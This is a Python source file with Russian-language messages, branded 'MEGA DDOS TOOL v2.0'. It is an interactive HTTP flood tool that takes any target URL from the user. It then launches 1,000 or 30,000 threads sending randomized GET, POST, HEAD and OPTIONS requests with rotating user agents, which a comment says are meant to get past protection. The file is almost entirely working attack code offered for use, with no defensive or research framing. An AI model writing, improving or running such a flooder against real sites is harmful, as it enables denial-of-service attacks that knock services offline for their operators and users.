import requests
import threading
import time
import random
import sys
import socket

# Глобальные переменные
attack_running = False
threads = []

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/115.0 Firefox/115.0'
]

def get_target():
    print("\n🎯 Введите цель для атаки:")
    print("Пример: https://example.com или http://192.168.1.1")
    target = input("Цель: ").strip()
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    return target

def dos_attack(target):
    """Мощная DOS атака (1000 потоков)"""
    global attack_running
    print(f"[DOS] Запускаем МОЩНУЮ атаку на {target}")
    print(f"[DOS] Количество потоков: 1000")
    print(f"[DOS] Ожидаемая нагрузка: ~50,000 запросов/секунду")
    
    attack_running = True
    threads = []
    
    def dos_worker(worker_id):
        while attack_running:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                }
                
                # Разные типы запросов для обхода защиты
                methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
                method = random.choice(methods)
                
                if method == 'POST':
                    response = requests.post(target, headers=headers, timeout=3, 
                                           data={'random': random.randint(1, 1000)})
                else:
                    response = requests.request(method, target, headers=headers, timeout=3)
                    
                print(f"[DOS-W{worker_id:04d}] {method} запрос - Status: {response.status_code}")
                
            except Exception as e:
                print(f"[DOS-W{worker_id:04d}] Ошибка: {str(e)}")
            
            time.sleep(0.01)  # 100 запросов в секунду на поток
    
    # Запускаем 1000 потоков для DOS атаки
    for i in range(1000):
        thread = threading.Thread(target=dos_worker, args=(i+1,))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    try:
        while attack_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[DOS] Останавливаем атаку...")
        attack_running = False
        for thread in threads:
            thread.join()
        print("[DOS] Атака остановлена")

def ddos_attack(target):
    """МЕГА DDOS атака (30,000 потоков)"""
    global attack_running
    print(f"[DDOS] Запускаем МЕГА атаку на {target}")
    print(f"[DDOS] Количество потоков: 30,000")
    print(f"[DDOS] Ожидаемая нагрузка: ~1,500,000 запросов/секунду")
    print(f"[DDOS] ⚠️ ЭКСТРЕМАЛЬНАЯ НАГРУЗКА! ⚠️")
    
    attack_running = True
    threads = []
    
    def ddos_worker(worker_id):
        while attack_running:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': '*/*',
                    'Connection': 'close',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                # Быстрые простые запросы
                response = requests.get(target, headers=headers, timeout=2)
                print(f"[DDOS-W{worker_id:05d}] Запрос - Status: {response.status_code}")
                
            except Exception as e:
                # В DDOS режиме не выводим ошибки для скорости
                pass
            
            time.sleep(0.001)  # 1000 запросов в секунду на поток
    
    # Запускаем 30,000 потоков для DDOS атаки
    for i in range(30000):
        try:
            thread = threading.Thread(target=ddos_worker, args=(i+1,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            if i % 1000 == 0:
                print(f"[DDOS] Запущено потоков: {i+1}/30000")
                
        except Exception as e:
            print(f"[DDOS] Ошибка создания потока {i+1}: {str(e)}")
            break
    
    print("[DDOS] Все потоки запущены! Атака началась!")
    
    try:
        while attack_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[DDOS] Останавливаем МЕГА атаку...")
        attack_running = False
        print("[DDOS] Ожидаем завершения потоков...")
        for thread in threads:
            thread.join()
        print("[DDOS] МЕГА атака остановлена")

def stop_attack():
    """Остановка всех атак"""
    global attack_running, threads
    attack_running = False
    print("🛑 Останавливаем все потоки...")
    for thread in threads:
        thread.join()
    threads = []
    print("✅ Все атаки остановлены")

def show_banner():
    print("⚡" * 40)
    print("           MEGA DDOS TOOL v2.0")
    print("         ULTRA POWERFUL EDITION")
    print("⚡" * 40)
    print("🚀 DOS: 1000 потоков (~50K RPS)")
    print("💥 DDOS: 30,000 потоков (~1.5M RPS)")
    print("⚡" * 40)

def main():
    global attack_running
    
    show_banner()
    
    while True:
        print("\n🔧 Выберите тип МОЩНОЙ атаки:")
        print("[1] 💣 MEGA DOS атака (1000 потоков)")
        print("[2] ☢️  ULTRA DDOS атака (30,000 потоков)")
        print("[3] ⛔ Остановить все атаки")
        print("[4] 🚪 Выход")
        
        choice = input("Выбор: ").strip()
        
        if choice == "1":
            target = get_target()
            dos_attack(target)
            
        elif choice == "2":
            target = get_target()
            print("⚠️  ПРЕДУПРЕЖДЕНИЕ: 30,000 потоков могут вызвать:")
            print("   - Высокую нагрузку на устройство")
            print("   - Зависание системы")
            print("   - Перегрев устройства")
            confirm = input("Продолжить? (y/N): ").strip().lower()
            if confirm == 'y':
                ddos_attack(target)
            
        elif choice == "3":
            stop_attack()
            
        elif choice == "4":
            stop_attack()
            print("👋 Выход из программы...")
            sys.exit(0)
            
        else:
            print("❌ Неверный выбор!")

if __name__ == "__main__":
    print("📦 Проверка зависимостей...")
    try:
        import requests
    except ImportError:
        print("❌ Установите requests: pip3 install requests")
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Программа прервана пользователем")
        stop_attack()
        sys.exit(0)
